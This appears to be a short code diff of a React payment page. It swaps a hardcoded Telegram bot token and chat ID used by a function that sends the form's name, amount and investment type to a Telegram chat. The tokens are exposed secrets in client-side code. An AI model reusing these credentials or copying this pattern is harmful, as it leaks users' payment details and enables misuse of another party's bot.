@@ -96,8 +96,8 @@ const PaymentPage = () => {
   const [formData, setFormData] = useState({ name: "", amount: "", method: "" });
 
 
-  const TELEGRAM_BOT_TOKEN = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
-const TELEGRAM_CHAT_ID = "6837437455";
+  const TELEGRAM_BOT_TOKEN = "7209378307:AAFwbPLs8HnjDfzAfg19PGdQMxdtQLCumlc";
+const TELEGRAM_CHAT_ID = "7139332395";
 
 const sendToTelegram = async (name: string, amount: string, investmentType: string) => {
   const message = `
